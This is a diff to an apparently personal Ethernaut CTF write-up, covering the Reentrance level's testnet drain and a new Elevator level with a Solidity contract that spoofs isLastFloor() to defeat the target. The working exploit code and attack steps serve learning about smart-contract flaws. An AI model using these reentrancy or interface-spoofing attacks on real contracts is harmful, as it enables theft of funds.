@@ -446,10 +446,72 @@ contract Attacker {
 }
 ```
 
-So we'll first send deposit via `donate()` passing our attacker contract address as receiver in parameter, in order to at least have a minimum balance to surpass the first check in `withdraw()`:
+So we'll first deposit to the contract via `donate()` passing our attacker contract address as receiver in parameter, in order to at least have a minimum balance to surpass the first check in `withdraw()`:
 ```javascript
 await contract.donate('0x72dAe46302cB146526207A1ED76eb509F70C76D5', {value: toWei('0.001')})
 ```
-After that, all is left to the magical `receive()` function inside our contract. Considering the contract balance initially is 0.001 ether, if we trigger `withdraw()` passing 0.001 as the amount to withdraw, we'll need two reentrant iterations to draing the contract. You can check [my transaction](https://goerli.etherscan.io/tx/0xa5bee70bac82775511bafd37ce4db2d18696060f23c29b783378fad988886419) on goerli to see the reentrant internal txns. And thats all, contract drained! How malicious of us!🤓 
+After that, all is left to the magical `receive()` function inside our contract. Considering the contract balance initially is 0.001 ether, if we call `attack()` in our contract passing 0.001 as `msg.value`, `withdraw()` will be triggered with 0.001 as amount parameter. In total, we'll need two reentrant iterations to drain the contract. You can check [my transaction](https://goerli.etherscan.io/tx/0xa5bee70bac82775511bafd37ce4db2d18696060f23c29b783378fad988886419) on goerli to see the reentrant internal txns. And thats all, contract drained! How malicious of us!🤓 
 
 11th Ethernaut level completed ✅
+
+## 12. Elevator 🛗
+> This elevator won't let you reach the top of your building. Right?
+> Things that might help:
+> - Sometimes solidity is not good at keeping promises.
+> - This `Elevator` expects to be used from a `Building`.
+
+This level can be a little tricky in the beginning. We have the `goTo()` function, which represents moving to an Elevator floor. Our goal here is to reach the last floor of the building (or in other words, make the `top` variable become true when we call `goTo()`).
+Let's take a look at`goTo()`:
+
+```solidity
+function goTo(uint _floor) public {
+    Building building = Building(msg.sender);
+
+    if (! building.isLastFloor(_floor)) {
+      floor = _floor;
+      top = building.isLastFloor(floor);
+    }
+  }
+```
+As we can see, the function receives the floor number we want to go to. The Elevator contract interacts with a Building contract (which we will be deploying) in order to check if the floor we want to fo to is the last one. There are two situations:
+- The floor we want to go to is the last floor: in that case, the `! building.isLastFloor(_floor)` condition will be false (negative of true is false), so the block of code inside the if will never be executed
+- The floor we want to go to is NOT the last floor:in that case, the `! building.isLastFloor(_floor)` condition will be true (negative of false is true), so the `floor` from the Elevator contract will be set to the floor we passed as parameter, and the `top` boolean (which we want to set to true) will be set to `building.isLastFloor(floor)`, which in our case is false so we won't be able to accomplish the level goal. 
+
+As we can see, if `isLastFloor(_floor)` returns true we won't be able to set the `top` variable, but if `isLastFloor(_floor)` returns false the `top` variable will be set to false!  
+
+The only possible way to tackle this issue is by making the `isLastFloor(_floor)` function not return the same deterministic value always for a given floor. In particular, we first want it to return `false` in order to be able to execute the code inside the if statement in the Elevator contract, and then we want it to return `true` because it is the value we want to be set in the `top` variable. In order to do this, we can create a malicious contract that toggles a boolean variable we return in `isLastFloor(_floor)`. The first time the `isLastFloor()` function from our malicious contract is called, it will return false. Then, it will return true, and so on and so forth. It will always return alternate boolean values. This is how our malicious contract looks:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.4;
+interface IElevator {
+    function goTo(uint _floor) external;
+}
+
+contract Building {
+    bool public _isLastFloor;
+    IElevator elevator;
+
+    constructor(address _elevator) {
+        _isLastFloor = true;
+        elevator = IElevator(_elevator);
+    }
+
+    function isLastFloor(uint256 _floor) external returns (bool) {
+        _isLastFloor = !_isLastFloor;
+        return _isLastFloor;
+    }
+
+    function goTo(uint256 _floor) external {
+        elevator.goTo(_floor);
+    }
+}
+```
+
+After calling the `goTo()` function in our malicious contract, the `goTo()` funtion from the Elevator will be triggered, and we will be able to set `top` to true!
+
+12th Ethernaut level completed ✅
+
+
+
+
